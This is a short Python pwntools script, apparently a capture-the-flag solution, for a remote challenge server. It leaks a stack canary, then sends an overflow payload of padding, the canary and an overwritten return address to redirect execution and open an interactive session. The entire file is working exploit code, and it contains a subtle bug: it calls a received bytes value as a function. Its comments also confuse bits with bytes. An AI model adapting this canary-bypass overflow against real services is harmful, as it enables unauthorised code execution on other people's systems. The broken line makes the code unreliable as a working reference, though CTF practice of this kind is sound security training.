#Made my Kasper Melheim
#imports
from pwn import *

#host and port number
conn = remote('ctf21.softwaresecurity.no', 7002)

#receive data from program
conn.recv()

#offset and canaryVal
offset = b'16'
conn.sendline(offset)
number = conn.recv()
canaryVal = p64(int(number()))

#overflow the 16 bits
bufferoverflow = b'X'*(16+8)

#target address
target = p64(0x4007f7)

#data we will send to the program
data = bufferoverflow + canaryVal + b'X'*8 + target

#send data and flag will be returned
conn.sendline(data)
conn.recv()
conn.interactive()